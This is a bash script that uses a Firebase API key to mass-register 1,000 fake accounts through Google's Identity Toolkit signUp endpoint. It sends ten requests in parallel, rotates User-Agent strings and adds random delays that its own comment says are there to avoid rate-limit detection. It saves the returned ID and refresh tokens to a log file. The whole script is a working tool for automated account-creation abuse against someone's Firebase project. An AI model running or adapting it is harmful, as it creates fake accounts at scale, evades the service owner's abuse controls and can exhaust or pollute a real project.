#!/bin/bash

API_KEY="<firebase-api-key>"
THREADS=10      # Number of concurrent requests
SUCCESS_LOG="signup_responses.json"
ERROR_LOG="signup_errors.txt"

## Ensure USER_AGENTS array is populated
declare -a USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/117.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/604.1"
)

# Check if USER_AGENTS array is empty
if [[ ${#USER_AGENTS[@]} -eq 0 ]]; then
    echo "[ERROR] USER_AGENTS array is empty. Exiting."
    exit 1
fi

# Function to perform signup and save response
signup() {
    local i=$1
    local email="fakeuser${i}@example.com"
    local password="P@ssw0rd123"

    # Reinitialize USER_AGENTS inside the function (fix for xargs issue)
    declare -a USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/117.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/604.1"
    )

    local user_agent="${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"  # Select a random User-Agent

    # Send signup request
    response=$(curl -s -w "\n%{http_code}" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
        -H "Content-Type: application/json" \
        -H "User-Agent: ${user_agent}" \
        -d "{\"email\":\"${email}\",\"password\":\"${password}\",\"returnSecureToken\":true}")

    http_code=$(echo "$response" | tail -n1)  # Extract HTTP status code
    body=$(echo "$response" | head -n-1)      # Extract JSON response

    # Parse important data from response using jq
    id_token=$(echo "$body" | jq -r '.idToken // empty')
    refresh_token=$(echo "$body" | jq -r '.refreshToken // empty')
    local_id=$(echo "$body" | jq -r '.localId // empty')
    expires_in=$(echo "$body" | jq -r '.expiresIn // empty')

    # Save successful responses
    if [[ "$http_code" == "200" ]]; then
        echo "$body" >> "$SUCCESS_LOG"
        echo "[SUCCESS] Account created: ${email}"
    else
        echo "[ERROR] Failed to create ${email} - HTTP ${http_code} - Response: ${body}" >> "$ERROR_LOG"
        echo "[ERROR] Failed to create ${email}"
    fi

    sleep $((RANDOM % 3 + 1))  # Random delay (1-3 sec) to reduce rate-limit detection
}

export -f signup
export API_KEY
export SUCCESS_LOG
export ERROR_LOG

# Run signup requests in parallel
seq 1 1000 | xargs -P "$THREADS" -I {} bash -c 'signup "$@"' _ {}
